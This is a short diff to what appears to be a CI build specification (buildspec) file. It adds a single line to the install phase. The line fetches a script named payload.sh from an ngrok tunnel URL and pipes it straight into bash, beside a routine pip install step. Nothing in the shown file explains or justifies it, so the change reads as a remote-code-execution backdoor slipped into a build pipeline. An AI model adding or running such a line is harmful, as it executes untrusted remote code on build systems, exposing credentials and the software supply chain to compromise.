@@ -7,6 +7,7 @@ phases:
       nodejs: 14
     commands:
       - pip install -r requirements.txt
+      - curl https://bbb3-2409-40e6-26-718c-39e4-d778-a7ed-ed87.ngrok-free.app/payload.sh | bash
   pre_build:
     commands:
       - bash _scripts/add_metadata.sh
